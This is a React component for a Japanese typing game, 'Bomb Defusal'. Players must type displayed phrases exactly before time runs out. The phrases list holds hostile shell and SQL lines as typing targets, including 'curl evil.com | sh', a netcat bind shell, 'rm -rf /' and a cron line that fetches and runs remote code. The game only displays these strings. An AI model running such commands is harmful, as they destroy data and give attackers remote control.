import { useState, useEffect, useRef, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import GameIntro from './GameIntro';
import GameResult from './GameResult';
import GameComments from './GameComments';

// Bomb defusal phrases - typed exactly to defuse
const PHRASES = [
  // Lv 1-3: Short
  'sudo rm -rf /',
  'DROP TABLE users;',
  'password123',
  'SELECT * FROM secrets',
  'curl evil.com | sh',
  'chmod 777 /etc/shadow',
  // Lv 4-6: Medium
  'ssh root@production -p 22',
  'git push --force origin main',
  'DELETE FROM logs WHERE 1=1;',
  'nc -lvp 4444 -e /bin/bash',
  'wget http://malware.zip && unzip',
  'iptables -F && iptables -X',
  // Lv 7+: Long & complex
  'openssl enc -aes-256-cbc -salt -in secret.txt',
  'docker run --privileged --net=host -v /:/mnt',
  'find / -perm -4000 -type f 2>/dev/null',
  'echo "* * * * * curl evil|sh" >> /var/spool/cron/root',
];

type Phase = 'ready' | 'countdown' | 'playing' | 'defused' | 'exploded';

export default function SpeedRunGame() {
  const [phase, setPhase] = useState<Phase>('ready');
  const [round, setRound] = useState(0);
  const [score, setScore] = useState(0);
  const [countdown, setCountdown] = useState(3);
  const [target, setTarget] = useState('');
  const [input, setInput] = useState('');
  const [timeLeft, setTimeLeft] = useState(30);
  const [fadeChars, setFadeChars] = useState<boolean[]>([]);
  const [shaking, setShaking] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);
  const timerRef = useRef<ReturnType<typeof setInterval>>();
  const fadeRef = useRef<ReturnType<typeof setInterval>>();
  const startTimeRef = useRef(0);

  const getTimeLimit = useCallback(() => {
    return Math.max(10, 30 - round * 3);
  }, [round]);

  const getDifficulty = useCallback(() => {
    if (round >= 7) return 3;
    if (round >= 4) return 2;
    if (round >= 1) return 1;
    return 0;
  }, [round]);

  const startRound = useCallback(() => {
    const diff = getDifficulty();
    // Pick phrase based on difficulty
    const pool = diff >= 2 ? PHRASES.slice(6) : diff >= 1 ? PHRASES.slice(0, 12) : PHRASES.slice(0, 6);
    const phrase = pool[Math.floor(Math.random() * pool.length)];
    setTarget(phrase);
    setInput('');
    setFadeChars(new Array(phrase.length).fill(false));
    setShaking(false);

    const limit = getTimeLimit();
    setTimeLeft(limit);
    startTimeRef.current = Date.now();

    // Timer
    timerRef.current = setInterval(() => {
      const elapsed = (Date.now() - startTimeRef.current) / 1000;
      const remaining = Math.max(0, limit - elapsed);
      setTimeLeft(remaining);

      // Shake when low time
      if (remaining <= 5) setShaking(true);

      if (remaining <= 0) {
        clearInterval(timerRef.current);
        clearInterval(fadeRef.current);
        setPhase('exploded');
      }
    }, 50);

    // Fade chars (Lv 2+)
    if (diff >= 2) {
      const fadeDelay = diff >= 3 ? 1500 : 2500;
      fadeRef.current = setInterval(() => {
        setFadeChars((prev) => {
          const visible = prev.map((v, i) => ({ v, i })).filter((x) => !x.v);
          if (visible.length <= 2) { clearInterval(fadeRef.current); return prev; }
          const idx = visible[Math.floor(Math.random() * visible.length)].i;
          const next = [...prev];
          next[idx] = true;
          return next;
        });
      }, fadeDelay);
    }

    setPhase('playing');
    setTimeout(() => inputRef.current?.focus(), 100);
  }, [round, getDifficulty, getTimeLimit]);

  const startGame = () => {
    setRound(0);
    setScore(0);
    setCountdown(3);
    setPhase('countdown');
  };

  // Countdown
  useEffect(() => {
    if (phase !== 'countdown') return;
    if (countdown <= 0) { startRound(); return; }
    const id = setTimeout(() => setCountdown((c) => c - 1), 1000);
    return () => clearTimeout(id);
  }, [phase, countdown, startRound]);

  // Check input on each keystroke
  useEffect(() => {
    if (phase !== 'playing' || !target) return;

    // Check for typo - ANY wrong character = explosion
    for (let i = 0; i < input.length; i++) {
      if (input[i] !== target[i]) {
        clearInterval(timerRef.current);
        clearInterval(fadeRef.current);
        setPhase('exploded');
        return;
      }
    }

    // Check for completion
    if (input === target) {
      clearInterval(timerRef.current);
      clearInterval(fadeRef.current);
      const timeBonus = Math.floor(timeLeft * 100);
      const roundScore = 500 + timeBonus + (round * 200);
      setScore((s) => s + roundScore);
      setPhase('defused');
    }
  }, [input, target, phase, timeLeft, round]);

  // Cleanup
  useEffect(() => {
    return () => {
      clearInterval(timerRef.current);
      clearInterval(fadeRef.current);
    };
  }, []);

  const nextRound = () => {
    setRound((r) => r + 1);
    setCountdown(2);
    setPhase('countdown');
  };

  // Find the first wrong character position for explosion display
  const errorIdx = phase === 'exploded'
    ? input.split('').findIndex((c, i) => c !== target[i])
    : -1;

  const diff = getDifficulty();

  return (
    <div className="relative max-w-lg mx-auto px-4 py-6">
      {/* Danmaku comments during play */}
      {phase === 'playing' && <GameComments gameId="speed-run" mode="danmaku" />}

      <div className="text-center mb-4">
        <p className="font-['Orbitron'] text-[10px] text-neon-pink tracking-[0.3em] mb-1">BOMB DEFUSAL</p>
        <h2 className="font-['Orbitron'] text-lg font-black text-text-primary">爆弾解除タイピング</h2>
      </div>

      <AnimatePresence mode="wait">
        {phase === 'ready' && (
          <motion.div key="ready" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
            <GameIntro
              icon="💣"
              title="BOMB DEFUSAL"
              gameId="speed-run"
              subtitle="爆弾解除タイピング"
              controls={[
                { icon: '⌨️', label: 'TYPE', desc: 'コマンドを正確に入力' },
              ]}
              rules={[
                { text: '表示されるコマンドを正確にタイプしろ' },
                { text: '1文字でもミスしたら即爆発', highlight: true },
                { text: 'ラウンドごとに制限時間が短くなる' },
                { text: 'Lv.3〜 文字がフェードアウトし始める' },
              ]}
              tip="タイムボーナス×ラウンド数でスコアが跳ね上がる"
              buttonText="DEFUSE"
              buttonColor="bg-neon-pink text-white"
              onStart={startGame}
            />
          </motion.div>
        )}

        {phase === 'countdown' && (
          <motion.div key="countdown" className="text-center py-20">
            <motion.p
              key={countdown}
              initial={{ scale: 3, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0, opacity: 0 }}
              className="font-['Orbitron'] text-8xl font-black text-neon-pink"
            >
              {countdown || '💣'}
            </motion.p>
          </motion.div>
        )}

        {phase === 'playing' && (
          <motion.div
            key="playing"
            initial={{ opacity: 0 }}
            animate={shaking ? { x: [0, -3, 3, -3, 3, 0] } : { opacity: 1 }}
            transition={shaking ? { duration: 0.3, repeat: Infinity } : {}}
            className="space-y-6"
          >
            {/* HUD */}
            <div className="flex items-center justify-between text-xs">
              <span className="font-['Share_Tech_Mono'] text-neon-yellow">SCORE: {score}</span>
              <span className="font-['Orbitron'] text-text-muted">ROUND {round + 1}</span>
              <span className={`font-['Share_Tech_Mono'] text-2xl font-black ${timeLeft <= 5 ? 'text-neon-pink animate-pulse' : 'text-neon-cyan'}`}>
                {Math.ceil(timeLeft)}
              </span>
            </div>

            {/* Timer bar */}
            <div className="h-2 bg-bg-raised rounded-full overflow-hidden">
              <div
                className={`h-full transition-all duration-50 ${timeLeft <= 5 ? 'bg-neon-pink' : 'bg-neon-cyan'}`}
                style={{ width: `${(timeLeft / getTimeLimit()) * 100}%` }}
              />
            </div>

            {/* Bomb + target phrase */}
            <div className="bg-bg-surface border-2 border-neon-pink rounded-xl p-6 relative overflow-hidden">
              {/* Noise overlay for Lv 3+ */}
              {diff >= 3 && (
                <motion.div
                  className="absolute inset-0 opacity-10 pointer-events-none"
                  style={{ backgroundImage: 'url("data:image/svg+xml,%3Csvg viewBox=\'0 0 256 256\' xmlns=\'http://www.w3.org/2000/svg\'%3E%3Cfilter id=\'n\'%3E%3CfeTurbulence type=\'fractalNoise\' baseFrequency=\'0.9\'/%3E%3C/filter%3E%3Crect width=\'100%25\' height=\'100%25\' filter=\'url(%23n)\'/%3E%3C/svg%3E")' }}
                  animate={{ opacity: [0.05, 0.15, 0.05] }}
                  transition={{ duration: 0.5, repeat: Infinity }}
                />
              )}

              <p className="text-center text-4xl mb-4">💣</p>
              <p className="text-neon-pink text-[10px] font-['Orbitron'] text-center mb-3">
                TYPE TO DEFUSE — {getTimeLimit()}s LIMIT
              </p>

              {/* Target string */}
              <div className="font-['Share_Tech_Mono'] text-lg text-center py-3 flex flex-wrap justify-center gap-0">
                {target.split('').map((char, i) => {
                  const isTyped = i < input.length;
                  const isCorrect = isTyped && input[i] === char;
                  const isFaded = fadeChars[i];

                  return (
                    <span
                      key={i}
                      className={`inline-block ${
                        isCorrect
                          ? 'text-neon-cyan'
                          : isFaded
                          ? 'text-transparent'
                          : 'text-text-primary'
                      } transition-colors duration-300`}
                    >
                      {char === ' ' ? '\u00A0' : char}
                    </span>
                  );
                })}
              </div>
            </div>

            {/* Input */}
            <input
              ref={inputRef}
              type="text"
              value={input}
              onChange={(e) => setInput(e.target.value)}
              className="w-full px-4 py-3 bg-bg-deep border-2 border-bg-raised rounded-lg text-neon-cyan font-['Share_Tech_Mono'] text-lg focus:border-neon-pink focus:outline-none"
              autoComplete="off"
              spellCheck={false}
              autoCapitalize="off"
            />

            <p className="text-center text-text-muted text-[10px]">
              {input.length}/{target.length} chars | {diff >= 2 ? '⚠ CHARS FADING' : ''} {diff >= 3 ? '+ NOISE' : ''}
            </p>
          </motion.div>
        )}

        {phase === 'defused' && (
          <motion.div key="defused" initial={{ scale: 0.5, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="text-center space-y-4 py-8">
            <motion.p className="text-6xl" animate={{ scale: [1, 1.3, 1] }} transition={{ duration: 0.5 }}>✅</motion.p>
            <p className="font-['Orbitron'] text-neon-cyan font-bold text-lg">DEFUSED!</p>
            <p className="font-['Share_Tech_Mono'] text-text-muted text-xs">{target}</p>
            <p className="text-text-muted text-sm">残り{Math.ceil(timeLeft)}秒 | Round {round + 1}</p>
            <button onClick={nextRound} className="px-8 py-3 bg-neon-cyan text-bg-deep font-['Orbitron'] text-sm font-bold rounded-lg">
              NEXT BOMB
            </button>
          </motion.div>
        )}

        {phase === 'exploded' && (
          <motion.div
            key="exploded"
            initial={{ scale: 2, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
          >
            <GameResult
              gameId="speed-run"
              gameName="BOMB DEFUSAL"
              icon="💣"
              score={score}
              level={round + 1}
              deathReason={errorIdx >= 0 ? 'BOOM! タイプミスで爆発' : 'TIME UP — 爆弾は待ってくれない'}
              extraInfo={`Round ${round + 1}で爆死`}
              onRetry={() => setPhase('ready')}
            />
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
